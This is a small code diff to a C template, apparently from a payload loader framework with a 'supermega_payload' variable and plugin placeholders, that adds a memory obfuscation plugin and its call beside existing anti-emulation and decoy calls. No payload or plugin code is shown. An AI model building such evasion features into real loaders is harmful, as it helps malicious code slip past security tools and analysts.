@@ -22,6 +22,7 @@ char *supermega_payload;
 
 {{plugin_executionguardrail}}
 
+{{plugin_memoryobfuscation}}
 
 int main()
 {
@@ -34,6 +35,9 @@ int main()
 
 	// Call: Anti Emulation plugin
 	antiemulation();
+
+	// Call: Memory Obfuscation plugin
+        memoryobfuscation();
 
 	// Call: Decoy plugin
 	decoy();
